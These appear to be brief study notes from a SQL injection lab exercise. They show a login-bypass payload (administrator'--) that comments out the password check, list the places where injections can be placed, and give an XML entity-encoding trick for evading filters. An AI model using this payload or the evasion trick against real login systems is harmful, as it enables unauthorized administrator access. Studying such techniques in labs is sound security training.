Task: Get administrator access by bypassing subverting application logic in the login page

SQL logic in use: SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'

Injection1 -- Passed
Login: administrator'--
Password: random123

Modified SQL query: SELECT * FROM users WHERE username = 'administrator'--' AND password = 'random123'


Where to inject sql injections:
Query strings: login, on the URL
In JSON, XML format (hide 'S' with '&#x53;' in XML)

Questions:
How do you know if the SQL DB is being used or not?
